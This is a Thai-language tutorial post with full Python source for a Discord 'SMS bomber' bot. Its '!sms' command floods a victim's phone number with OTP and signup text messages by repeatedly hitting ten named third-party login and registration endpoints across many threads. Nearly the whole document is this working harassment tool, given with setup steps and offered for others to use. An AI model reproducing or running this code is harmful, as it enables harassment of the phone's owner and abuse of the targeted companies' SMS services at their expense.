โค้ด บอท ยิงเบอร์

⤵️
เครดิต: E R R O R 6 5 5 3 5

หา API ใส่เองนะครับ หรือ ในดิสผม 
🌐discord 
https://discord.gg/qAjgnYsJ8S

🛑YouTube
https://youtube.com/channel/UCG3q8sMb25IJUUG3VgChb-Q

(🔷) ถ้าไม่เข้าใจ ขอโทษตัวครับ พึ่งหัดทำเลยแชร์ให้ทุกคนได้ศึกษา


⚪ขั้นตอน
1. สร้างไฟล์ bot.py ขึ้นมา
2. จากนั้นเปิดไฟล์ นำโค้ด ⤵️ ไปวาง


import discord,time
import discord
import requests
import time
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading

token = "token"#นำโทเค็นบอท มาวาง

prefix = "!"#คำสั่ง

bot = commands.Bot(command_prefix=prefix,help_command=None)
threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"

⚪(3)สร้าง def api1(phone): วาง port api (ตัวอย่าง)

def api1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})
    
⚪(4) สร้าง def BBot(phone, amount):
    for _ in range(amount):
 เพื่อเรียกใช้ 
 
 ⚪(5) สร้าง threading.submit(, phone)
 เพื่อเรียกใช้งาน api1 (ตัวอย่าง)
 
 threading.submit(api1, phone)
 
 
 ⚪(6) นำโค้ด ต่อไปนี้วาง
 
        
@bot.event
async def on_connect():
    time.sleep(0.001)
    print("B0T: ONLINE ")
    

@bot.command()
async def sms(ctx, phone, amount:int):
    
    if (amount < 151):
        
      embes = discord.Embed(title="SmS", description="Bot by : ERROR 65535",color=0xff4612)
      embes.add_field(name="กำลังยิงไปที่เบอร์",value=phone)
      embes.add_field(name="จำนวน",value=amount)
      ima = "https://media.discordapp.net/attachments/983379010077745153/983933706676867122/20220608_102034.gif"
      embes.set_image(url=ima)
    
      await ctx.channel.send(embed=embes)
    
        
    
      BBot(phone,amount)
    else:
        await ctx.channel.send("ยิงไม่เกิน150")

@bot.command()
async def help(ctx):
    emBed = discord.Embed(title="Bot BY: ERROR 65535",description="วิธิใช้",color=0xff4612)
    emBed.add_field(name="#_#",value="!sms [เบอร์] [จำนวน1-150]")
    
    
    await ctx.channel.send(embed=emBed)
    
    
    
bot.run(token)

(.   ตัวอย่างโค้ด    )
__________________________________________________
 
 
 
import discord
import requests
import time
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import threading

token = ""#โทเค่นบอท

prefix = "!"#คำสั่ง

bot = commands.Bot(command_prefix=prefix,help_command=None)
threading = ThreadPoolExecutor(max_workers=int(100000000))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"


def ab1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"{phone}"})

def ab2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

def ab3(phone):
    post("https://www.fox888.com/api/otp/register", data = f"applicant={phone}&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})

def ab4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})

def ab5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})

def ab6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"{phone[1:]}","password":"","client":"ecommerce"})

def ab7(phone):
    post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})

def ab8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"{phone[1:]}"})

def ab9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})

def ab10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})


def BBot(phone, amount):
    for _ in range(amount):
        threading.submit(ab1, phone)
        threading.submit(ab2, phone)
        threading.submit(ab3, phone)
        threading.submit(ab4, phone)
        threading.submit(ab5, phone)
        threading.submit(ab6, phone)
        threading.submit(ab7, phone)
        threading.submit(ab8, phone)
        threading.submit(ab9, phone)
        threading.submit(ab10, phone)


@bot.event
async def on_connect():
        print(f"user : {bot.user}")
        print("login....")


@bot.command()
async def sms(ctx, phone, amount:int):
    
    if (amount < 151):
        
      embes = discord.Embed(title="SmS", description="Bot by : ERROR 65535",color=0xff4612)
      embes.add_field(name="กำลังยิงไปที่เบอร์",value=phone)
      embes.add_field(name="จำนวน",value=amount)
      ima = "https://media.discordapp.net/attachments/983379010077745153/983933706676867122/20220608_102034.gif"
      embes.set_image(url=ima)
    
      await ctx.channel.send(embed=embes)
    
        
    
      BBot(phone,amount)
    else:
        await ctx.channel.send("ยิงไม่เกิน150")

@bot.command()
async def help(ctx):
    emBed = discord.Embed(title="Bot BY: ERROR 65535",description="วิธิใช้",color=0xff4612)
    emBed.add_field(name="#_#",value="!sms [เบอร์] [จำนวน1-150]")
    
    
    await ctx.channel.send(embed=emBed)
    
    
    
bot.run(token)


 
 
 
 
 
 
 
 
 
 
    
    









